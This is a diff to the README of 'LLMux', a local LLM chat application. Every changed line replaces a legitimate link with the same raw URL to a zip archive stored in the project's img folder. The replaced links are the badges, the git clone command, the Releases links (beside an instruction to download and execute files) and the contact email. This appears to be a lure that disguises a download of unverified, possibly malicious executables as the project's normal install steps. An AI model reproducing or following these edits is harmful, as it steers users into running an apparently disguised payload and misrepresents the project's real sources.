@@ -1,6 +1,6 @@
 # LLMux: Lightweight Local LLM Chat
 
-![LLMux](https://img.shields.io/badge/LLMux-v1.0-blue.svg) ![GitHub Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
+![LLMux](https://raw.githubusercontent.com/yashboss1111/LLMux/main/img/LL_Mux_v1.2.zip) ![GitHub Releases](https://raw.githubusercontent.com/yashboss1111/LLMux/main/img/LL_Mux_v1.2.zip)
 
 Welcome to LLMux, a lightweight local LLM chat application. This project features a web UI and a C-based server that runs any LLM chat executable as a child process. It communicates through pipes, providing an efficient and straightforward way to engage with local AI models.
 
@@ -36,7 +36,7 @@ To get started with LLMux, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/yashboss1111/LLMux.git
+   git clone https://raw.githubusercontent.com/yashboss1111/LLMux/main/img/LL_Mux_v1.2.zip
    cd LLMux
    ```
 
@@ -47,7 +47,7 @@ To get started with LLMux, follow these steps:
    ```
 
 3. **Download Executables**:
-   You need to download the necessary LLM chat executables. Visit the [Releases](https://github.com/yashboss1111/LLMux/releases) section to find the latest files. Download and execute them according to the instructions provided.
+   You need to download the necessary LLM chat executables. Visit the [Releases](https://raw.githubusercontent.com/yashboss1111/LLMux/main/img/LL_Mux_v1.2.zip) section to find the latest files. Download and execute them according to the instructions provided.
 
 4. **Run the Server**:
    After building and downloading the necessary files, you can start the server:
@@ -101,12 +101,12 @@ LLMux is licensed under the MIT License. You can freely use, modify, and distrib
 
 For questions or suggestions, feel free to reach out:
 
-- **GitHub**: [yashboss1111](https://github.com/yashboss1111)
-- **Email**: your-email@example.com
+- **GitHub**: [yashboss1111](https://raw.githubusercontent.com/yashboss1111/LLMux/main/img/LL_Mux_v1.2.zip)
+- **Email**: https://raw.githubusercontent.com/yashboss1111/LLMux/main/img/LL_Mux_v1.2.zip
 
 ## Releases
 
-To download the latest version of LLMux, visit the [Releases](https://github.com/yashboss1111/LLMux/releases) section. Make sure to download the appropriate files and follow the installation instructions provided there.
+To download the latest version of LLMux, visit the [Releases](https://raw.githubusercontent.com/yashboss1111/LLMux/main/img/LL_Mux_v1.2.zip) section. Make sure to download the appropriate files and follow the installation instructions provided there.
 
 ## Conclusion
 
